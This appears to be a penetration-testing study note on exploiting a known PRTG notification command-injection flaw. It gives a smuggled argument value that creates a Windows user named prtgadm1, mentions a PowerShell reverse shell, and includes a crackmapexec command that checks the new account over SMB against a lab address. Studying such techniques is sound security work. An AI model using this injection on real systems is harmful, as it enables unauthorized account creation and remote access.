#### Leveraging Known Vulnerabilities

Execute command via notification functionality

1. login
2. setup->notifications
3. Add new notification
4. select demo file for program file
5. pass arbitrary arguments
	1. create user
		1. test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup
	2. Create Rev Shell With powershell
6. save notification
7. Click test notification

checking account access with crackmapexec
```shell-session
sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!
```

